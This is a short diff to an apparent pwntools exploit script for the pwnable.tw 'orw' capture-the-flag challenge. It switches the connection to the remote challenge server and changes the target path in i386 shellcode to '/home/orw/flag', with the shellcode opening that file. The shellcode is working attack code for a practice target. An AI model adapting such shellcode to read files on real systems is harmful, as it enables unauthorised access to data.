@@ -1,11 +1,11 @@
 from pwn import *
 context(arch='i386',log_level='debug')
-conn=process("./orw")
+# conn=process("./orw")
 conn=remote("chall.pwnable.tw",10001)
 shellcode="""
 		mov eax,5
 		call getstr
-		.ascii "./flag"
+		.ascii "/home/orw/flag"
 		.byte 0
 	getstr:
 		pop ebx
